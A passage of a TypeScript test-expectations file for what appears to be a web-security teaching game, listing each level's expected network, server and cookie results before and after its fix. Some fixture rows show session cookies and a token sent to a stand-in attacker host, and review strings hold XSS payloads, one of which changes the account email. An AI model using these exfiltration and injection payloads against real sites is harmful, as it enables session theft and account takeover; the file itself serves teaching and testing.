// What every Web fundamentals level's app does, before and after its fix: the unit tests run the goals on these
// observations and check each prediction's answer against them; e2e/web-levels.spec.ts checks in a real browser that
// the CORS model, server.js and the app really do this (so neither the table nor an answer can drift).
import type { PredictionAnswer, ProbeValue } from '../../../../shared/levels'
import { ORDER_FAILED, ORDER_IN } from '../../../../shared/levels/web/02-order-preflight'

export interface ExpectedRun {
  probes: Record<string, ProbeValue>
  /** How many errors the check run sees (the browser's red lines count). */
  errors: number
  /** The Network panel's rows, 'METHOD address status', in the order sent (a preflight is its own row). */
  network: string[]
  /** server.js's access lines, in the order answered ('OPTIONS /orders 200'). */
  server: string[]
  /** What each preflight asked in Access-Control-Request-Headers, in the order sent. */
  asks?: string[]
  /** Console lines the texts quote or the predictions order, each the start of a line, in the Console's order. */
  says?: string[]
  /** Chapter 2: every cookie a request carried, 'METHOD address name', in the order sent. */
  sent?: string[]
  /** The cookies in the jar once the run is over (names, in the Application panel's order). */
  stored?: string[]
  /** The names of the cookies the browser refused in the run. */
  refused?: string[]
  /** The names a script on the page can read once the run is over. */
  readable?: string[]
  /** Chapter 3: the keys the page's own origin keeps once the run is over, 'local token' / 'session draft'. */
  storage?: string[]
  /** Chapter 3: the thief's requests from outside the browser the Server panel shows, 'METHOD address status', in order. */
  replayed?: string[]
  /** Chapter 4: the CDN's log, 'who METHOD address OUTCOME', in order (a level with a cache; none without a CDN). */
  cdn?: string[]
  /** Chapter 5: what each painted frame showed of the watched elements, every item in order (the Event loop panel's frames). */
  painted?: string[]
  /** Chapter 5: each layout the page's code forced, by the read that forced it, in order. */
  forced?: string[]
  /** Chapter 5: each transition or animation that started, 'element property', in order. */
  animated?: string[]
}

/** The same line n times (a loop's forced layouts). */
const times = (n: number, line: string): string[] => Array.from({ length: n }, () => line)

export interface ExpectedLevel {
  /** The right answer to each question of the prediction. */
  answers: PredictionAnswer[]
  /** A reload of the starting files (a practice task: the run its answers are about). */
  start: ExpectedRun
  /** A reload after the solution's edits (scenarios). */
  solved?: ExpectedRun
}

const API = 'https://api.cornerbakery.shop'
/**
 * The basket guards once a level is fixed: the promo page and another subdomain are refused (with Lena's cookie or
 * without it), and the shop's own page without her cookie is told no by the server (401, or 400 without a basket).
 */
const GUARDED = { promo: 'blocked', promoAnon: 'blocked', other: 'blocked', anon: 'refused' } as const
const blocked = (url: string) => `Access to fetch at '${url}' from origin 'https://cornerbakery.shop' has been blocked by CORS policy: `

export const expected: Record<string, ExpectedLevel> = {
  'web-01-menu-blocked': {
    answers: ['blocked'],
    start: {
      probes: { menu: 0, read: 0 },
      errors: 3,
      network: [`GET ${API}/menu CORS error`],
      server: ['GET /menu 200'],
      says: [
        `${blocked(`${API}/menu`)}No 'Access-Control-Allow-Origin' header is present on the requested resource.`,
        `GET ${API}/menu net::ERR_FAILED 200 (OK)`,
        'Uncaught (in promise) TypeError: Failed to fetch'
      ]
    },
    solved: { probes: { menu: 6, read: 1 }, errors: 0, network: [`GET ${API}/menu 200`], server: ['GET /menu 200'], says: ['Menu loaded · 6 products'] }
  },
  'web-practice-console-order': {
    answers: [['asking', 'ready', 'blocked', 'none']],
    start: {
      probes: {},
      errors: 2,
      network: [`GET ${API}/specials CORS error`],
      server: ['GET /specials 200'],
      says: ['Asking for the specials…', 'Page ready', `${blocked(`${API}/specials`)}No 'Access-Control-Allow-Origin' header`, `GET ${API}/specials net::ERR_FAILED 200 (OK)`, 'No specials: Failed to fetch']
    }
  },
  'web-practice-same-origin': {
    answers: ['same', 'other', 'other'],
    start: {
      probes: {},
      errors: 4,
      network: ['GET /api/hours 200', 'GET https://www.cornerbakery.shop/api/hours CORS error', 'GET https://cornerbakery.shop:8443/api/hours CORS error'],
      server: [],
      says: [blocked('https://www.cornerbakery.shop/api/hours'), blocked('https://cornerbakery.shop:8443/api/hours'), 'https://cornerbakery.shop:443/api/hours: open 7:00–18:00']
    }
  },
  'web-02-order-preflight': {
    answers: ['preflight'],
    start: {
      probes: { order: ORDER_FAILED, read: 0 },
      errors: 3,
      network: [`POST ${API}/orders CORS error`, `OPTIONS ${API}/orders 200`],
      server: ['OPTIONS /orders 200'],
      asks: ['content-type'],
      says: [`${blocked(`${API}/orders`)}Response to preflight request doesn't pass access control check: No 'Access-Control-Allow-Origin' header is present on the requested resource.`, `POST ${API}/orders net::ERR_FAILED`, 'TypeError: Failed to fetch']
    },
    solved: { probes: { order: ORDER_IN, read: 1 }, errors: 0, network: [`POST ${API}/orders 201`, `OPTIONS ${API}/orders 204`], server: ['OPTIONS /orders 204', 'POST /orders 201'], asks: ['content-type'] }
  },
  'web-practice-simple-or-preflight': {
    answers: ['simple', 'preflight', 'simple'],
    start: {
      probes: {},
      errors: 1,
      network: [`POST ${API}/newsletter 201`, `GET ${API}/menu 200`, `OPTIONS ${API}/menu 204`, `POST ${API}/orders 400`],
      server: ['POST /newsletter 201', 'OPTIONS /menu 204', 'POST /orders 400', 'GET /menu 200'],
      asks: ['authorization'],
      says: [`POST ${API}/orders 400 (Bad Request)`]
    }
  },
  'web-03-basket-credentials': {
    answers: ['wildcard'],
    start: {
      probes: { basket: 0, read: 0, promo: 'blocked', promoAnon: 'refused', other: 'blocked', anon: 'refused' },
      errors: 3,
      network: [`GET ${API}/basket CORS error`],
      // the second is the page on promo.cornerbakery.shop the goal sends (same site: Lena's cookie goes along)
      server: ['GET /basket 200', 'GET /basket 200', 'GET /basket 401', 'GET /basket 200', 'GET /basket 401'],
      says: [`${blocked(`${API}/basket`)}The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' when the request's credentials mode is 'include'.`, `GET ${API}/basket net::ERR_FAILED 200 (OK)`, 'Uncaught (in promise) TypeError: Failed to fetch']
    },
    solved: { probes: { basket: 3, read: 1, ...GUARDED }, errors: 0, network: [`GET ${API}/basket 200`], server: ['GET /basket 200', 'GET /basket 200', 'GET /basket 401', 'GET /basket 200', 'GET /basket 401'], says: ['Basket loaded · 3 lines'] }
  },
  'web-practice-readable-answers': {
    answers: [['favourites']],
    start: {
      probes: {},
      errors: 6,
      network: [`GET ${API}/stamps CORS error`, `GET ${API}/favourites 200`, `GET ${API}/address CORS error`, `GET ${API}/last-order CORS error`],
      server: ['GET /stamps 200', 'GET /favourites 200', 'GET /address 200', 'GET /last-order 200'],
      says: [
        `${blocked(`${API}/stamps`)}The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*'`,
        `${blocked(`${API}/address`)}The value of the 'Access-Control-Allow-Credentials' header in the response is '' which must be 'true'`,
        `${blocked(`${API}/last-order`)}The 'Access-Control-Allow-Origin' header has a value 'https://cornerbakery.shop/' that is not equal to the supplied origin.`,
        '/favourites: read'
      ]
    }
  },
  'web-04-basket-header': {
    answers: [['menu', 'options']],
    start: {
      probes: { basket: 0, read: 0, promo: 'blocked', promoAnon: 'blocked', other: 'blocked', anon: 'blocked' },
      errors: 3,
      network: [`GET ${API}/menu 200`, `GET ${API}/basket CORS error`, `OPTIONS ${API}/basket 204`],
      // the last is the page on promo.cornerbakery.shop the goal sends: refused at its preflight
      server: ['GET /menu 200', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204'],
      asks: ['x-basket-id'],
      says: [`${blocked(`${API}/basket`)}Request header field x-basket-id is not allowed by Access-Control-Allow-Headers in preflight response.`, `GET ${API}/basket net::ERR_FAILED`, 'Uncaught (in promise) TypeError: Failed to fetch']
    },
    solved: {
      probes: { basket: 2, read: 1, ...GUARDED },
      errors: 0,
      network: [`GET ${API}/menu 200`, `GET ${API}/basket 200`, `OPTIONS ${API}/basket 204`],
      server: ['GET /menu 200', 'OPTIONS /basket 204', 'GET /basket 200', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'GET /basket 401'],
      asks: ['x-basket-id']
    }
  },
  'web-practice-which-headers': {
    answers: [['basket', 'authorization']],
    start: { probes: {}, errors: 0, network: [`GET ${API}/menu 200`, `OPTIONS ${API}/menu 204`], server: ['OPTIONS /menu 204', 'GET /menu 200'], asks: ['authorization,x-basket-id'], says: ['Menu: 200'] }
  },
  'web-05-works-with-curl': {
    answers: ['preflight'],
    start: {
      probes: { remove: 2, arrived: 0, ...GUARDED },
      errors: 3,
      network: [`GET ${API}/basket 200`, `OPTIONS ${API}/basket 204`, `DELETE ${API}/basket/lines/2 CORS error`, `OPTIONS ${API}/basket/lines/2 204`],
      server: ['OPTIONS /basket 204', 'GET /basket 200', 'OPTIONS /basket/lines/2 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'GET /basket 400'],
      asks: ['x-basket-id', 'x-basket-id'],
      says: [`${blocked(`${API}/basket/lines/2`)}Method DELETE is not allowed by Access-Control-Allow-Methods in preflight response.`, `DELETE ${API}/basket/lines/2 net::ERR_FAILED`, 'Uncaught (in promise) TypeError: Failed to fetch']
    },
    solved: {
      probes: { remove: 1, arrived: 1, ...GUARDED },
      errors: 0,
      network: [`GET ${API}/basket 200`, `OPTIONS ${API}/basket 204`, `DELETE ${API}/basket/lines/2 204`, `OPTIONS ${API}/basket/lines/2 204`, `GET ${API}/basket 200`, `OPTIONS ${API}/basket 204`],
      server: ['OPTIONS /basket 204', 'GET /basket 200', 'OPTIONS /basket/lines/2 204', 'DELETE /basket/lines/2 204', 'OPTIONS /basket 204', 'GET /basket 200', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'OPTIONS /basket 204', 'GET /basket 400'],
      asks: ['x-basket-id', 'x-basket-id', 'x-basket-id']
    }
  },
  'web-practice-which-methods': {
    answers: [['put', 'patch', 'delete']],
    start: {
      probes: {},
      errors: 0,
      network: ['get', 'head', 'post', 'put', 'patch', 'delete'].flatMap(method => [`${method.toUpperCase()} ${API}/try/${method} 200`, ...(['put', 'patch', 'delete'].includes(method) ? [`OPTIONS ${API}/try/${method} 204`] : [])]),
      server: ['GET /try/get 200', 'HEAD /try/head 200', 'POST /try/post 200', 'OPTIONS /try/put 204', 'OPTIONS /try/patch 204', 'OPTIONS /try/delete 204', 'PUT /try/put 200', 'PATCH /try/patch 200', 'DELETE /try/delete 200']
    }
  },
  'web-06-sign-in-lost': {
    answers: ['refused'],
    start: {
      probes: { who: 'Not signed in: please sign in again.', account: 0, attack: 0, anon: 'refused', stolen: 401 },
      errors: 1,
      network: [`POST ${API}/login 200`, `GET ${API}/account 401`, `POST ${API}/orders 401`],
      server: ['POST /login 200', 'GET /account 401', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
      refused: ['session']
    },
    solved: {
      probes: { who: 'Signed in as Lena', account: 1, attack: 0, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`],
      stored: ['session']
    }
  },
  'web-practice-which-stored': {
    answers: [['region', 'theme']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/prefs 200`],
      server: ['GET /prefs 200'],
      stored: ['region', 'theme'],
      refused: ['lang', 'promo', 'partner'],
      readable: ['theme']
    }
  },
  'web-07-order-from-elsewhere': {
    answers: ['placed'],
    start: {
      probes: { attack: 201, other: 201, lookalike: 201, before: 4, own: 'Thanks! Your order is in.', after: 5, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `POST ${API}/orders 201`, `POST ${API}/orders 201`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'POST /orders 201', 'POST /orders 201', 'POST /orders 201', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `POST ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session']
    },
    solved: {
      probes: { attack: 401, other: 401, lookalike: 401, before: 0, own: 'Thanks! Your order is in.', after: 1, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'GET /orders 200', 'POST /orders 401', 'POST /orders 401', 'POST /orders 401', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/orders session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session']
    }
  },
  'web-practice-attacker-requests': {
    answers: [['deals']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/pixel 200`, `POST ${API}/basket 201`, `GET ${API}/deals 200`],
      server: ['GET /pixel 200', 'POST /basket 201', 'GET /deals 200'],
      sent: [`GET ${API}/deals session`],
      stored: ['session']
    }
  },
  'web-08-script-reads-session': {
    answers: [['session', 'theme']],
    start: {
      probes: { who: 'Signed in as Lena', account: 1, leaked: 2, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 200 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?c=theme%3Ddark%3B%20session%3Dlena-7f3a 200', 'GET https://cheap-flour.example/collect?c=theme%3Ddark%3B%20session%3Dlena-7f3a 200', `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 200'],
      sent: [`GET ${API}/account session`, `GET ${API}/account device`, `GET ${API}/account basket`, `GET ${API}/orders session`, `GET ${API}/orders device`, `GET ${API}/orders basket`, `POST ${API}/orders session`, `POST ${API}/orders device`, `POST ${API}/orders basket`, `GET ${API}/orders session`, `GET ${API}/orders device`, `GET ${API}/orders basket`],
      stored: ['basket', 'device', 'session', 'theme'],
      readable: ['session', 'theme']
    },
    solved: {
      probes: { who: 'Signed in as Lena', account: 1, leaked: 0, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?c=theme%3Ddark 200', 'GET https://cheap-flour.example/collect?c=theme%3Ddark 200', `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/account device`, `GET ${API}/account basket`, `GET ${API}/orders session`, `GET ${API}/orders device`, `GET ${API}/orders basket`, `POST ${API}/orders session`, `POST ${API}/orders device`, `POST ${API}/orders basket`, `GET ${API}/orders session`, `GET ${API}/orders device`, `GET ${API}/orders basket`],
      stored: ['basket', 'device', 'session', 'theme'],
      readable: ['theme']
    }
  },
  'web-practice-same-site': {
    answers: ['same', 'other', 'other'],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/from/promo 200`, `GET ${API}/from/http 200`, `GET ${API}/from/lookalike 200`],
      server: ['GET /from/promo 200', 'GET /from/http 200', 'GET /from/lookalike 200'],
      sent: [`GET ${API}/from/promo session`],
      stored: ['session']
    }
  },
  'web-09-cookie-path': {
    answers: [['me']],
    start: {
      probes: { who: 'Signed in as Lena', orders: 0, own: 'Sorry, your order did not go through.', anon: 'refused', stolen: 401 },
      errors: 3,
      network: [`POST ${API}/auth/login 200`, `GET ${API}/auth/me 200`, `GET ${API}/orders 401`, `POST ${API}/orders 401`, `GET ${API}/orders 401`],
      server: ['POST /auth/login 200', 'GET /auth/me 200', 'GET /orders 401', 'POST /orders 401', 'GET /orders 401', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/auth/me session`],
      stored: ['session']
    },
    solved: {
      probes: { who: 'Signed in as Lena', orders: 1, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/auth/login 200`, `GET ${API}/auth/me 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /auth/login 200', 'GET /auth/me 200', 'GET /orders 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/auth/me session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session']
    }
  },
  'web-practice-domain': {
    answers: [['basket-api', 'lang-api', 'lang-shop']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/basket 200`, 'GET /api/hours 200'],
      server: ['GET /basket 200'],
      sent: [`GET ${API}/basket basket`, `GET ${API}/basket lang`, 'GET /api/hours lang'],
      stored: ['basket', 'lang'],
      readable: ['lang']
    }
  },
  'web-10-email-link': {
    answers: ['sign-in'],
    start: {
      probes: { link: 401, fresh: 401, attack: 401, other: 401, lookalike: 401, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/pickup/1042 401`, `GET ${API}/pickup/1042 401`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /pickup/1042 401', 'GET /pickup/1042 401', 'GET /pickup/1042 401', 'POST /orders 401', 'POST /orders 401', 'POST /orders 401', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session']
    },
    solved: {
      probes: { link: 200, fresh: 401, attack: 401, other: 401, lookalike: 401, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/pickup/1042 200`, `GET ${API}/pickup/1042 200`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `POST ${API}/orders 401`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /pickup/1042 200', 'GET /pickup/1042 200', 'GET /pickup/1042 401', 'POST /orders 401', 'POST /orders 401', 'POST /orders 401', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/pickup/1042 session`, `GET ${API}/pickup/1042 session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session']
    }
  },
  'web-practice-link-cookies': {
    answers: [['session', 'widget', 'lang']],
    start: {
      probes: {},
      errors: 0,
      network: [`GET ${API}/pickup/1042 200`],
      server: ['GET /pickup/1042 200'],
      sent: [`GET ${API}/pickup/1042 session`, `GET ${API}/pickup/1042 widget`, `GET ${API}/pickup/1042 lang`],
      stored: ['lang', 'prefs', 'session', 'widget']
    }
  },
  // chapter 3: auth & tokens (the storage the page's origin keeps, and the thief's requests from outside the browser)
  'web-11-token-in-storage': {
    answers: ['anything'],
    start: {
      probes: { who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 200, still: 'Signed in as Lena', other: 401, lookalike: 401, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `OPTIONS ${API}/account 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, 'GET https://cheap-flour.example/collect?s=%7B%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsZW5hIiwiaWF0IjoxNzk0OTA4NDYwLCJleHAiOjE3OTQ5MTIwNjB9.o0kJVy6__1eQdV3OeTRbv9XEBJxgt1_PSaSK-OyLCYs%22%7D 200', `POST ${API}/orders 201`, `OPTIONS ${API}/orders 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, 'GET https://cheap-flour.example/collect?s=%7B%22token%22%3A%22eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsZW5hIiwiaWF0IjoxNzk0OTA4NDYwLCJleHAiOjE3OTQ5MTIwNjB9.o0kJVy6__1eQdV3OeTRbv9XEBJxgt1_PSaSK-OyLCYs%22%7D 200', `GET ${API}/account 200`, `OPTIONS ${API}/account 204`, `GET ${API}/orders 200`, `OPTIONS ${API}/orders 204`, `POST ${API}/orders 401`, `POST ${API}/orders 401`],
      server: ['POST /login 200', 'OPTIONS /account 204', 'GET /account 200', 'OPTIONS /orders 204', 'GET /orders 200', 'GET /account 200', 'OPTIONS /orders 204', 'POST /orders 201', 'OPTIONS /orders 204', 'GET /orders 200', 'GET /account 401', 'GET /account 200', 'OPTIONS /account 204', 'GET /account 200', 'OPTIONS /orders 204', 'GET /orders 200', 'POST /orders 401', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
      asks: ['authorization', 'authorization', 'authorization', 'authorization', 'authorization', 'authorization'],
      storage: ['local token'],
      replayed: [`GET ${API}/account 200`]
    },
    solved: {
      probes: { who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 401, still: 'Signed in as Lena', other: 401, lookalike: 401, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?s=%7B%7D 200', `POST ${API}/orders 201`, `GET ${API}/orders 200`, 'GET https://cheap-flour.example/collect?s=%7B%7D 200', `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/orders 401`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'POST /orders 201', 'GET /orders 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account?s=%7B%7D 401', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'POST /orders 401', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`],
      stored: ['session'],
      replayed: [`GET ${API}/account 401`]
    }
  },
  'web-practice-script-reads': {
    answers: [['basket', 'step', 'theme']],
    start: {
      probes: {},
      errors: 0,
      network: [],
      server: [],
      stored: ['session', 'theme'],
      readable: ['theme'],
      storage: ['local basket', 'session checkout-step']
    }
  },
  'web-12-review-runs': {
    answers: ['changed'],
    start: {
      probes: { who: 'Signed in as Lena', mallory: '“Lovely crust! ” · Mallory', email: 1, guarded: 4, sam: '“Five stars from me” · Sam', jo: '“Nice rye & alert(1) soft inside” · Jo', elements: 3, emailAfter: 2, anon: 'refused', stolen: 401 },
      errors: 3,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/reviews 200`, `POST ${API}/account/email 200`, `GET ${API}/reviews 200`, `POST ${API}/account/email 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /reviews 200', 'POST /account/email 200', 'POST /reviews 201', 'POST /reviews 201', 'GET /reviews 200', 'POST /account/email 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/account/email session`, `POST ${API}/account/email session`],
      stored: ['session']
    },
    solved: {
      probes: { who: 'Signed in as Lena', mallory: `“Lovely crust! <img src="x" onerror="fetch('${API}/account/email', { method: 'POST', credentials: 'include', body: new URLSearchParams('email=mallory@cheap-flour.example') })">” · Mallory`, email: 0, guarded: 4, sam: '“Five stars <IMG SRC=x ONERROR=this.remove()> from me” · Sam', jo: '“Nice <b onmouseover = "this.remove()">rye</b> & <script>alert(1)</script> soft inside” · Jo', elements: 0, emailAfter: 0, anon: 'refused', stolen: 401 },
      errors: 0,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/reviews 200`, `GET ${API}/reviews 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /reviews 200', 'POST /reviews 201', 'POST /reviews 201', 'GET /reviews 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`],
      stored: ['session']
    }
  },
  'web-practice-which-run': {
    answers: [['img', 'adjacent']],
    start: {
      probes: {},
      errors: 2,
      network: ['GET https://cheap-flour.example/ran?case=img 200', 'GET https://cheap-flour.example/ran?case=adjacent 200'],
      server: []
    }
  },
  'web-13-token-never-expires': {
    answers: ['ok'],
    start: {
      probes: { away: 'Not signed in: please sign in again.', har: 200, forged: 401, again: 'Signed in as Lena', harAgain: 200, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 1,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/account 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 200', 'GET /account 401', 'GET /account 200', 'POST /login 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 200', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session'],
      replayed: [`GET ${API}/account 200`]
    },
    solved: {
      probes: { away: 'Not signed in: please sign in again.', har: 401, forged: 401, again: 'Signed in as Lena', harAgain: 401, own: 'Thanks! Your order is in.', anon: 'refused', stolen: 401 },
      errors: 1,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `GET ${API}/account 401`, `POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 201`, `GET ${API}/orders 200`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'GET /account 401', 'POST /login 200', 'GET /account 200', 'GET /orders 200', 'GET /account 401', 'POST /orders 201', 'GET /orders 200', 'GET /orders 401', 'GET /account 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`, `GET ${API}/account session`, `GET ${API}/orders session`, `POST ${API}/orders session`, `GET ${API}/orders session`],
      stored: ['session'],
      replayed: [`GET ${API}/account 401`]
    }
  },
  'web-practice-which-tokens': {
    answers: [['valid', 'forever']],
    start: {
      probes: {},
      errors: 3,
      network: [`GET ${API}/check/valid 200`, `GET ${API}/check/expired 401`, `GET ${API}/check/forever 200`, `GET ${API}/check/edited 401`, `GET ${API}/check/none 401`],
      server: ['GET /check/valid 200', 'GET /check/expired 401', 'GET /check/forever 200', 'GET /check/edited 401', 'GET /check/none 401']
    }
  },
  'web-14-signed-out-again': {
    answers: [['order']],
    start: {
      probes: { order: 'Sorry, your order did not go through.', refreshes: 0, who: 'Not signed in: please sign in again.', idle: 0, old: 401, anon: 'refused', stolen: 401, month: 'Sorry, your order did not go through.', gaveUp: 0 },
      errors: 5,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `GET ${API}/orders 401`, `GET ${API}/account 401`, `POST ${API}/orders 401`, `GET ${API}/orders 401`],
      server: ['POST /login 200', 'GET /account 200', 'GET /orders 200', 'POST /orders 401', 'GET /orders 401', 'GET /account 401', 'POST /login 200', 'GET /account 401', 'GET /orders 401', 'GET /account 401', 'POST /orders 401', 'GET /orders 401'],
      sent: [`GET ${API}/account session`, `GET ${API}/orders session`]
    },
    solved: {
      probes: { order: 'Thanks! Your order is in.', refreshes: 1, who: 'Signed in as Lena', idle: 1, old: 401, anon: 'refused', stolen: 401, month: 'Sorry, your order did not go through.', gaveUp: 3 },
      errors: 5,
      network: [`POST ${API}/login 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/auth/refresh 204`, `POST ${API}/orders 201`, `GET ${API}/orders 200`, `GET ${API}/account 200`, `GET ${API}/orders 200`, `POST ${API}/orders 401`, `POST ${API}/auth/refresh 401`, `GET ${API}/orders 401`, `POST ${API}/auth/refresh 401`],
